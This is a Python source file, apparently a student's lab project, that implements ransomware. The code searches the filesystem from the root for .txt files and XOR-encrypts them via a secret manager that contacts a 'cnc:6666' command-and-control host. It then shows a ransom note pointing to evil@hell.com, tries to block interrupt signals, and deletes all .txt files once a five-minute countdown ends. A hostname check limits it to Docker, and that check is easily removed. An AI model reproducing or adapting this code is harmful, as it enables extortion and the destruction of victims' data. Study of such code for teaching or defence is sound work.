"""
    Anouar EL GAZRI 5A IoT
"""

import logging
import socket
import re
import sys
from pathlib import Path # librairie Path pour lire des fichiers
from secret_manager import SecretManager
import os
import signal # used for intercepting the signals
import time
import threading


CNC_ADDRESS = "cnc:6666"
TOKEN_PATH = "/root/token"

ENCRYPT_MESSAGE = """
  _____                                                                                           
 |  __ \                                                                                          
 | |__) | __ ___ _ __   __ _ _ __ ___   _   _  ___  _   _ _ __   _ __ ___   ___  _ __   ___ _   _ 
 |  ___/ '__/ _ \ '_ \ / _` | '__/ _ \ | | | |/ _ \| | | | '__| | '_ ` _ \ / _ \| '_ \ / _ \ | | |
 | |   | | |  __/ |_) | (_| | | |  __/ | |_| | (_) | |_| | |    | | | | | | (_) | | | |  __/ |_| |
 |_|   |_|  \___| .__/ \__,_|_|  \___|  \__, |\___/ \__,_|_|    |_| |_| |_|\___/|_| |_|\___|\__, |
                | |                      __/ |                                               __/ |
                |_|                     |___/                                               |___/ 

Your txt files have been locked. Send an email to evil@hell.com with title '{token}' to unlock your data. 
"""
class Ransomware:
    def __init__(self) -> None:
        """
            Default constructor to initialize
        """
        self.check_hostname_is_docker()
        self._log = logging.getLogger(self.__class__.__name__)
        # catch signals to prevent interruption
        signal.signal(signal.SIGINT, self.exiting_blocking) # SIGINT for Ctrl + C
        signal.signal(signal.SIGTERM, self.exiting_blocking) # SIGTERM for stopping the program
    
    def check_hostname_is_docker(self)->None:
        """
            Method used to check if we are in a docker and prevent running this program outside of container
        """
        hostname = socket.gethostname()
        result = re.match("[0-9a-f]{6,6}", hostname)
        if result is None:
            print(f"You must run the malware in docker ({hostname}) !")
            sys.exit(1)

    def exiting_blocking(self) -> None:
        """
            Method used to block the exit of the program
        """
        self._log.info("EXIT BLOCKED")
        self._log.info("You must send an email to 'evil@hell.com' with title '{token}' to unlock your data.")

    def get_files(self, filter:str)->list:
        """
            Method used to return all files matching the filter
        """
        files_path = Path("/") # actual path
        files_found = [str(file) for file in files_path.rglob(filter)]

        return files_found

    def encrypt(self):
        """
            Main Method Encyrpt used to encrypt the files of the victim
        """
        # countdown running in the background using a thread
        countdown_thread = threading.Thread(target=self.countdown, args=(300,))  # countdown of 5 min
        countdown_thread.start()
        
        # txt files listed
        txt_files = self.get_files("*.txt")
        
        # create a secret manager
        secret_manager = SecretManager(remote_host_port=CNC_ADDRESS, path=TOKEN_PATH)
        
        # setup function called to create the crypto data
        secret_manager.setup()

        #secret_manager.leak_files(txt_files)
        
        # files encryption
        secret_manager.xorfiles(txt_files)
        
        # get the hex token
        token_hex = secret_manager.get_hex_token()
        
        # printing the message
        print(ENCRYPT_MESSAGE.format(token=token_hex))

        countdown_thread.join() # wait for the countdown to finish


    def decrypt(self):
        """
            Method used to decrypt the files of the victim
        """
        secret_manager = SecretManager(remote_host_port=CNC_ADDRESS, path=TOKEN_PATH)

        secret_manager.load() # load the crypto data

        files_to_decrypt = self.get_files("*.txt") # we get the list of the files encrypted

        while True:
            try:
                key_in_b64 = input("Please enter the B64 key: ") # asking the user to enter the b64 key
                secret_manager.set_key(key_in_b64) # key verification
                secret_manager.xorfiles(files_to_decrypt) # decrypt files by doing a second time the xor operation
                secret_manager.clean() # remove the crypto data
                self._log.info("Decryption successful. All files have been restored.")

                break 

            except Exception as e:
                # ERROR handling
                self._log.info("ERROR : Invalid key. Please try again.")
                self._log.info(f"ERROR DETAILS : {str(e)}")
        
    def countdown(self, seconds: int):
        """
            Method used to countdown the time before the files are deleted
        """
        while seconds > 0:
            minutes, secs = divmod(seconds, 60)
            countdown = f"{minutes:02d}:{secs:02d}"
            print(f"\rTime left before deletion : {countdown}", end="")
            time.sleep(1)
            seconds -= 1

        # once the countdown is over, txt files data are deleted
        self._log.info("TIME OUT!!! Your DATA will be deleted !")
        txt_files = self.get_files("*.txt")
        for file in txt_files:
            os.remove(file)
            self._log.info(f"FILE {file} destroyed!")

# Main running
if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    if len(sys.argv) < 2:
        ransomware = Ransomware()
        ransomware.encrypt()
    elif sys.argv[1] == "--decrypt":
        ransomware = Ransomware()
        ransomware.decrypt()